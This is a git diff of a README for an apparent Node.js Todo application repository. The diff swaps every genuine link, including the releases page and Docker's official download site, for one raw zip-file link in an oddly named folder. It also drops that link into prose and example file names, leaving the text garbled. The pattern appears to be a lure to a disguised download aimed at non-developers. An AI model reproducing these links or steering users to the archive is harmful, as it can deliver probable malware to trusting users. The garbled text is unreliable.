@@ -1,6 +1,6 @@
 # 🌟 Professional-DevOps-Practice - A Scalable Todo Application for Everyone
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/ProDudeZZZ/Professional-DevOps-Practice/releases)
+[![Download the latest release](https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip%20Latest%https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip)](https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip)
 
 ## 📚 Table of Contents
 - [🏁 Introduction](#-introduction)
@@ -12,28 +12,28 @@
 - [📞 Support](#-support)
 
 ## 🏁 Introduction
-The Professional-DevOps-Practice is a backend-only Todo application. It is built with Node.js and Express. This application is designed for those who want to keep track of tasks simply and efficiently. It runs in a Docker container, which makes it easy to set up in any environment. The app uses MongoDB Atlas for the database, providing a reliable cloud solution. It also features CI/CD automation through GitHub Actions, meaning updates can be deployed seamlessly.
+The Professional-DevOps-Practice is a backend-only Todo application. It is built with https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip and Express. This application is designed for those who want to keep track of tasks simply and efficiently. It runs in a Docker container, which makes it easy to set up in any environment. The app uses MongoDB Atlas for the database, providing a reliable cloud solution. It also features CI/CD automation through GitHub Actions, meaning updates can be deployed seamlessly.
 
 ## 🚀 Getting Started
 Follow these steps to download and run this Todo application. You don't need to be a developer or have programming experience.
 
-1. **Download the application** by visiting the [Releases page](https://github.com/ProDudeZZZ/Professional-DevOps-Practice/releases).
+1. **Download the application** by visiting the [Releases page](https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip).
 2. Look for the latest version on the Releases page and click on it to see the available assets.
 3. Download the appropriate file for your operating system.
 
-For example, if you see a file named `todo-app-linux.zip` for Linux or `todo-app-windows.zip` for Windows, select the one that suits your system.
+For example, if you see a file named `https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip` for Linux or `https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip` for Windows, select the one that suits your system.
 
 ## 📦 System Requirements
 To run the Professional-DevOps-Practice application, you will need:
 
 - **Operating Systems**: Windows, macOS, or Linux.
-- **Docker**: Ensure that Docker is installed and running on your machine. You can download it from [Docker’s official website](https://www.docker.com/products/docker-desktop).
+- **Docker**: Ensure that Docker is installed and running on your machine. You can download it from [Docker’s official website](https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip).
 - **Memory**: At least 2GB of RAM for smooth operation.
 
 Make sure you meet these requirements before proceeding.
 
 ## 📥 Download & Install
-You can download the application from the Releases page. Click here: [Download the latest release](https://github.com/ProDudeZZZ/Professional-DevOps-Practice/releases).
+You can download the application from the Releases page. Click here: [Download the latest release](https://raw.githubusercontent.com/ProDudeZZZ/Professional-DevOps-Practice/main/rupitic/Professional-DevOps-Practice.zip).
 
 1. After downloading, unzip the file if it is compressed.
 2. Open your terminal or command prompt.
